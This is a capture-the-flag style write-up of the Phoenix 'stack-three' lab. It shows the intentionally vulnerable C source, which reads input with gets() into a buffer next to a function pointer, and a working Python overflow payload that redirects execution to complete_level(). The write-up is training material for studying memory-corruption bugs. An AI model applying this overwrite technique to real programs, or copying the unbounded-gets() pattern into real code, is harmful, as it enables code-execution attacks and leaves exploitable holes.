# Code Analysis:

## Code Execution:

```bash
./stack_three

test
```

Nothing happens.

## Source Code:

```c
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int (*fp)();
  } locals;

  printf("%s\n", BANNER);

  locals.fp = NULL;
  gets(locals.buffer);

  if (locals.fp) {
    printf("calling function pointer @ %p\n", locals.fp);
    fflush(stdout);
    locals.fp();
  } else {
    printf("function pointer remains unmodified :~( better luck next time!\n");
  }

  exit(0);
}
```

1. The program declares a function pointer named `fp` set to 0.
2. Initializes a 64-byte `buffer` with the user's input value.
3. If `fp` != 0, execute `fp` pointing to where it points.

There's also a function `complete_level()` (the one we are interested in) that prints if we have succeeded or not.

# Exploitation:

## How?

To exploit this binary, you need to reach the `complete_level()` function. To do this, you must:
- Find the offset to reach `fp`.
- Insert the address of the `complete_level()` function into `fp`.

## Demonstration:

### Finding the Offset

```bash
python3 -c 'print("A" * 65)' | ./stack-three 

Welcome to phoenix/stack-three, brought to you by https://exploit.education
calling function pointer @ 0x41
Segmentation fault
```

The offset is therefore 64.

### Inserting the Address of `complete_level()`

```bash
python3 -c 'print("A" * 64 + "\x9d\x06\x40\x00\x00\x00\x00\x00")' | ./stack-three

Welcome to phoenix/stack-three, brought to you by https://exploit.education

Traceback (most recent call last):
  File "<string>", line 1, in <module>
  
UnicodeEncodeError: 'ascii' codec can't encode character '\x9d' in position 64: ordinal not in range(128)
function pointer remains unmodified :~( better luck next time!
```

On the phoenix virtual machine, Python was incorrectly encoding non-ASCII character strings, which means I had to use the sys module to input the binary address of `complete_level()`.

### Payload:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x9d\x06\x40\x00\x00\x00\x00\x00")' | ./stack-three

Welcome to phoenix/stack-three, brought to you by https://exploit.education
calling function pointer @ 0x40069d

Congratulations, you've finished phoenix/stack-three :-) Well done!
```
